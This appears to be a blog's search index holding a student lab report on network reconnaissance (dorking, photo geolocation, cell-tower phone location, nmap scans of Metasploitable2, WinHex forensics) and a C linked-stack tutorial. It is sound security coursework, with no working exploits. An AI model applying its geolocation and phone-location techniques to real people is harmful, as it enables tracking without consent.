<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>实验一 网络扫描与网络侦察</title>
      <link href="/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/"/>
      <url>/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="实验一-网络扫描与网络侦察"><a href="#实验一-网络扫描与网络侦察" class="headerlink" title="实验一 网络扫描与网络侦察"></a>实验一 网络扫描与网络侦察</h1><h2 id="1-实验目的和要求"><a href="#1-实验目的和要求" class="headerlink" title="1. 实验目的和要求"></a>1. 实验目的和要求</h2><p>实验目的：理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</p><p>系统环境：Kali Linux 2、Windows</p><p>网络环境：交换网络结构</p><p>实验工具： Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali）；WinHex、数据恢复软件等</p><h2 id="2-实验步骤"><a href="#2-实验步骤" class="headerlink" title="2. 实验步骤"></a>2. 实验步骤</h2><h3 id="1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。"><a href="#1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。" class="headerlink" title="1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。"></a>1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。</h3><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/1.png"></p><h3 id="2、照片中的女生在哪里旅行？截图搜索到的地址信息。"><a href="#2、照片中的女生在哪里旅行？截图搜索到的地址信息。" class="headerlink" title="2、照片中的女生在哪里旅行？截图搜索到的地址信息。"></a>2、照片中的女生在哪里旅行？截图搜索到的地址信息。</h3><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/2-1.png"></p><p>回答：使用搜索引擎得到地址，再通过谷歌地图找到门店（需要调整时间）</p><p>![](..&#x2F;images&#x2F;实验1-网络扫描与网络侦察.assets&#x2F;2-1.png</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/2-2.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/2-3.png"></p><h3 id="3、手机位置定位。"><a href="#3、手机位置定位。" class="headerlink" title="3、手机位置定位。"></a>3、手机位置定位。</h3><p>通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。</p><p>获取自己手机的LAC和CID：</p><p>Android 获取方法：Android： 拨号*#<em>#4636#</em>#*进入手机信息工程模式后查看</p><p>iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest</p><p>Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity</p><p>若不能获取，用右图信息。</p><p>截图你查询到的位置信息。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/3-1.png.jpg"></p><p>回答：使用右图信息</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/3-2.png"></p><h3 id="4、编码解码"><a href="#4、编码解码" class="headerlink" title="4、编码解码"></a>4、编码解码</h3><p>将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</p><p>回答：</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/4-1.png"></p><h3 id="5、地址信息"><a href="#5、地址信息" class="headerlink" title="5、地址信息"></a>5、地址信息</h3><h4 id="5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"><a href="#5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。" class="headerlink" title="5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"></a>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</h4><p>回答：该用户使用的设备为苹果品牌</p><p>该IP定位为“广西桂林市桂林电子科技大学”</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-1-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-1-2.png"></p><h4 id="5-2-访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因"><a href="#5-2-访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因" class="headerlink" title="5.2 访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因"></a>5.2 访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因</a></h4><p>回答：不相同，原因：</p><p> 我们能够上网靠的是isp组织分给我们的Ip地址，但是这个ip地址一般不是给个人的，一般都是给一个单位，一个区域的，也就是说我们实际上能接触到的一般都是私有地址，即我们用ipconig查到的都是私有地址，也就相当于局域网内的ip地址，当我们真正联网时，会先把数据发送到路由，然后再由路由进行处理实现真正的联网操作，路由的地址才是真正联网的Ip地址，也就是pubilc ip，而我们在自己电脑上查到的都是私有ip</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-2-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-2-2.png"></p><h3 id="6、NMAP使用"><a href="#6、NMAP使用" class="headerlink" title="6、NMAP使用"></a>6、NMAP使用</h3><h4 id="6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能"><a href="#6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能" class="headerlink" title="6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能"></a>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能</h4><p>回答:通过NMAP扫描整个子网得到Metasploitable2的ip以及开发端口</p><p>其中</p><p>a.80端口为web服务</p><p>b.3306端口为MySQL数据库服务</p><p>C.21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务。</p><p>FTP服务主要是为了在两台计算机之间实现文件的上传与下载，一台计算机作为FTP客户端，另一台计算机作为FTP服务器，可以采用匿名（anonymous）登录和授权用户名与密码登录两种方式登录FTP服务器。</p><p>d.22端口主要用于SSH(Secure SHell)</p><p>SSH的英文全称是Secure SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够防止DNS和IP欺骗。还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道”</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/6-1-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/6-1-2.png"></p><h4 id="6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图"></a>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图</h4><p>回答：扫描命令为“nmap -O +目标 IP”</p><p>Metasploitable2的操作系统为linux</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/6-2-1.png"></p><h4 id="6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码"><a href="#6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码" class="headerlink" title="6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码"></a>6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码</h4><h4 id="6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h4><p>回答：WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的<a href="https://baike.baidu.com/item/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/16623990?fromModule=lemma_inlink">勒索病毒</a>软件，大小3.3MB，由不法分子利用<a href="https://baike.baidu.com/item/NSA/1128824?fromModule=lemma_inlink">NSA</a>（National Security Agency，<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%AE%89%E5%85%A8%E5%B1%80/300052?fromModule=lemma_inlink">美国国家安全局</a>）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播 [1]。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。 [2]勒索病毒是自熊猫烧香以来影响力最大的<a href="https://baike.baidu.com/item/%E7%97%85%E6%AF%92/4811584?fromModule=lemma_inlink">病毒</a>之一。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已经影响到金融，能源，医疗等众多行业，造成严重的危机管理问题。中国部分Windows操作系统用户遭受感染，校园网用户首当其冲，受害严重，大量实验室数据和毕业设计被锁定加密。部分大型企业的应用系统和数据库文件被加密后，无法正常工作，影响巨大。</p><h4 id="7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h4><p>回答：1. Apache Struts 目录遍历导致文件上传漏洞</p><p>Apache Struts是美国阿帕奇（Apache）软件基金会下属的Jakarta项目中的一个子项目，是一个基于MVC设计的Web应用框架。漏洞源于文件上传逻辑存在缺陷，攻击者可利用上传文件参数启动路径遍历，上传恶意文件，进而导致远程代码执行。</p><p>2.Apache ActiveMQ jolokia 远程代码执行漏洞</p><p> Apache ActiveMQ 中存在<a href="https://so.csdn.net/so/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&spm=1001.2101.3001.7020">远程代码执行</a>漏洞，具有 Apache ActiveMQ 服务器TCP端口（默认为61616）访问权限的远程攻击者可以通过发送恶意数据到服务器从而执行任意代码。</p><p>3.CVE-2019-0211 Apache Root Privilege Escalation</p><p>在MPM prefork中，以root身份运行的主服务器进程管理一个单线程、低权限（www-data）的工作进程池，用于处理HTTP请求。为了从工作进程那里获得反馈，Apache维护了一个共享内存区域（SHM）计分板，其中包含各种信息，例如工作进程的PID，以及它们处理的最后一个请求。每个工作进程都以维护与其PID相关联的process_score结构为目标，并且具有对SHM的完全读&#x2F;写访问权限。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/7-1.png"></p><h3 id="8、Winhex简单数据恢复与取证"><a href="#8、Winhex简单数据恢复与取证" class="headerlink" title="8、Winhex简单数据恢复与取证"></a>8、Winhex简单数据恢复与取证</h3><h4 id="8-1-elephant-jpg不能打开了，利用WinHex修复，说明修复过程。"><a href="#8-1-elephant-jpg不能打开了，利用WinHex修复，说明修复过程。" class="headerlink" title="8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。"></a>8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</h4><p>回答：文件类型为jpg文件，但文件头却为00 00 FF E0,jpg文件的文件头应为FF D8 FF E0,修改文件头得到图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">一、常见文件头文件尾</span><br><span class="line">1、图片</span><br><span class="line">JPEG 文件头：FF D8 FF 文件尾：FF D9</span><br><span class="line">TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00</span><br><span class="line">PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82</span><br><span class="line">GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3B</span><br><span class="line">BMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M)</span><br><span class="line">TIFF (tif) 文件头：49 49 2A 00</span><br><span class="line">ico 文件头：00 00 01 00</span><br><span class="line">Adobe Photoshop (psd) 文件头：38 42 50 53</span><br><span class="line">2、office文件</span><br><span class="line">MS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0</span><br><span class="line">MS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4A</span><br><span class="line">WordPerfect (wpd) 文件头：FF 57 50 43</span><br><span class="line">Adobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2E</span><br><span class="line">application/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1</span><br><span class="line">Email [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</span><br><span class="line">Outlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6F</span><br><span class="line">Outlook (pst) 文件头：21 42 44 4E</span><br><span class="line">Rich Text Format (rtf) 文件头：7B 5C 72 74 66</span><br><span class="line">txt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的</span><br><span class="line">3、压缩包文件</span><br><span class="line">ZIP Archive (zip) 文件头：50 4B 03 04 文件尾：50 4B</span><br><span class="line">RAR Archive (rar) 文件头：52 61 72 21</span><br><span class="line">4、音频文件</span><br><span class="line">Wave (wav) 文件头：57 41 56 45</span><br><span class="line">audio(Audio) 文件头： 4D 54 68 64</span><br><span class="line">audio/x-aac（aac）</span><br><span class="line">文件头：FF F1(9)</span><br><span class="line">5、视频文件</span><br><span class="line">AVI (avi) 文件头：41 56 49 20</span><br><span class="line">Real Audio (ram) 文件头：2E 72 61 FD</span><br><span class="line">Real Media (rm) 文件头：2E 52 4D 46</span><br><span class="line">MPEG (mpg) 文件头：00 00 01 BA(3)</span><br><span class="line">Quicktime (mov) 文件头：6D 6F 6F 76</span><br><span class="line">Windows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11</span><br><span class="line">MIDI (mid) 文件头：4D 54 68 64</span><br><span class="line">6、代码文件</span><br><span class="line">XML (xml) 文件头：3C 3F 78 6D 6C</span><br><span class="line">HTML (html) 文件头：68 74 6D 6C 3E</span><br><span class="line">Quicken (qdf) 文件头：AC 9E BD 8F</span><br><span class="line">Windows Password (pwl) 文件头：E3 82 85 96</span><br><span class="line">7、其他类型</span><br><span class="line">windows证书文件(der) 文件头：30 82 03 C9</span><br><span class="line">CAD (dwg) 文件头：41 43 31 30</span><br><span class="line">Windows Shortcut (lnk) 文件头：4C 00 00 00</span><br><span class="line">Windows reg(reg) 文件头：52 45 47 45 44 49 54 34</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-1-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-1-2.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-1-3.jpg"></p><h4 id="8-2-笑脸背后的阴霾：图片smile有什么隐藏信息。"><a href="#8-2-笑脸背后的阴霾：图片smile有什么隐藏信息。" class="headerlink" title="8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。"></a>8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。</h4><p>回答：隐藏信息为tom is the kille-.</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-2-1.png"></p><h4 id="8-3-尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"><a href="#8-3-尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。" class="headerlink" title="8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"></a>8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</h4><p> 回答：下载一定的软件即可恢复</p><h3 id="9、讨论学校热点GUET-WiFi的安全问题，以截图说明。"><a href="#9、讨论学校热点GUET-WiFi的安全问题，以截图说明。" class="headerlink" title="9、讨论学校热点GUET-WiFi的安全问题，以截图说明。"></a>9、讨论学校热点GUET-WiFi的安全问题，以截图说明。</h3><h3 id="10、实验小结"><a href="#10、实验小结" class="headerlink" title="10、实验小结"></a>10、实验小结</h3><p><strong>实验报告小结需要描述Ethical Hacking的理解</strong>。</p><p>我对Ethical Hacking的理解：我对道德黑客的理解是指通过授权且合法的方式，以保护和提升网络安全为目标的技术活动。道德黑客是一群具备专业知识和技能的安全专家，他们通过模拟攻击和漏洞测试来评估系统和网络的安全性。他们的主要目的是发现潜在的安全风险，并向组织提供建议和解决方案来增强其安全性。</p><p>道德黑客与恶意黑客有着明显的区别，他们严格遵守法律和道德准则，并通过与组织合作的方式来执行其任务。他们的活动是经过授权的，通常在组织的请求下进行，以保护系统免受潜在的攻击和数据泄露。</p><p>道德黑客的工作范围包括对网络、应用程序和系统进行漏洞扫描、渗透测试、安全评估等活动。他们利用类似黑客攻击的技术手段来发现漏洞，然后向组织报告这些漏洞以及相应的修复建议。</p><p>总而言之，道德黑客的目标是通过帮助组织发现并修复安全漏洞，提高网络和系统的安全性，从而保护用户的数据和隐私。他们在维护网络安全方面发挥着重要的作用。</p><p>1.向网络上传个人照片时，若不想暴露个人位置，需要对照片的关键信息打上马赛克。</p><p>2.通过LAC码和CID码，可以初步确定手机用户的位置，所以自己手机的LAC和CID码不应该随便让其他人知道。</p><p>3.利用一定软件可以进行编码解码。注意：如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。</p><p>4.当文件打不开时，可以利用winhex进行修复</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈</title>
      <link href="/2023/12/08/%E6%A0%88/"/>
      <url>/2023/12/08/%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h1 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">PNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">top</span>, * <span class="title">LinkStack</span>;</span></span><br></pre></td></tr></table></figure><h1 id="创建空栈"><a href="#创建空栈" class="headerlink" title="创建空栈"></a>创建空栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LinkStack <span class="title function_">SetNullStack_link</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">LinkStack top=(LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line"><span class="keyword">if</span>(top!=<span class="literal">NULL</span>) top-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;创建空栈失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="判空"><a href="#判空" class="headerlink" title="判空"></a>判空</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullStack_Link</span><span class="params">(LinkStack top)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(top-&gt;next==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="进栈"><a href="#进栈" class="headerlink" title="进栈"></a>进栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Push_link</span><span class="params">(LinkStack top,<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode p;</span><br><span class="line">p=(PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;进栈创建失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p-&gt;data=x;</span><br><span class="line">p-&gt;next=top-&gt;next;</span><br><span class="line">top-&gt;next=p;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="取栈顶"><a href="#取栈顶" class="headerlink" title="取栈顶"></a>取栈顶</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Top_link</span><span class="params">(LinkStack top)</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(IsNullStack_Link(top)) <span class="built_in">printf</span>(<span class="string">&quot;此栈为空\n&quot;</span>);</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> top-&gt;next-&gt;data;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><h1 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pop_link</span><span class="params">(LinkStack top)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode p;</span><br><span class="line"><span class="keyword">if</span>(IsNullStack_Link(top)) <span class="built_in">printf</span>(<span class="string">&quot;此栈为空\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p=top-&gt;next;</span><br><span class="line">top-&gt;next=p-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表</title>
      <link href="/2023/12/08/%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/12/08/%E9%93%BE%E8%A1%A8/</url>
      
